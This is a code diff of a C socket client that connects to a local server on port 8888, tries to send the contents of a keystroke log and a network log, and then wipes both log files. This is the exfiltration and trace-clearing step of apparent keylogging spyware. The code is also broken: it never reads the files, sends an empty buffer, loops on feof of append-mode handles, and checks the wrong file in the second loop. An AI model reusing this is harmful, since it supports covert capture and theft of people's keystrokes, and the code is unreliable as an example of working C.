@@ -1,17 +1,14 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>       // strlen
-#include <sys/socket.h>   // socket
-#include <arpa/inet.h>    // inet_addr
-#include <unistd.h>       // write
-#include <fcntl.h>
 
-int main(int argc , char *argv[])
+#include "server_client.h"
+
+void run_client(void)
 {
     // Variables
-    int sock, read_size, ret;
+    int sock, read_size, ret, bytesRead;
     struct sockaddr_in server;
-    char message[3000];
+    char send_buffer[2000];
     
     char *addr = "127.0.0.1";
     short port = 8888;
@@ -37,28 +34,35 @@ int main(int argc , char *argv[])
     }
     printf("Connecting to server...\n");
     
+    memset(send_buffer, 0, sizeof(send_buffer));  //clear send buffer
     /*Open keylog file for writing*/
-    FILE *keylog_file = fopen("log/keylog.txt", "a");
+    FILE *keylog_log = fopen("log/keylog.txt", "a");
     /*Write keylog file*/
-    if ((ret = write(sock, message, strlen(message))) <= 0) {
-        perror("Error writing\n");
-        close(sock);
-        exit(0);
+    while(!feof(keylog_log))
+    {
+        if ((ret = write(sock, send_buffer, strlen(send_buffer))) <= 0) {
+            perror("Error writing keylog log\n");
+            close(sock);
+            exit(0);
+        }
     }
     /*Clear and close keylog file*/
     fclose(fopen("log/keylog.txt", "w"));
     
+    memset(send_buffer, 0, sizeof(send_buffer));  //clear send buffer
     /*Open network_log file for writing*/
     FILE *network_log = fopen("log/network.txt", "a");
     /*Write keylog file*/
-    if ((ret = write(sock, message, strlen(message))) <= 0) {
-        perror("Error writing network log\n");
-        close(sock);
-        exit(0);
+    while(!feof(keylog_log))
+    {
+        if ((ret = write(sock, send_buffer, strlen(send_buffer))) <= 0) {
+            perror("Error writing network log\n");
+            close(sock);
+            exit(0);
+        }
     }
     /*Clear and close keylog file*/
     fclose(fopen("log/network.txt", "w"));
     
     close(sock);
-    return 0;
 }
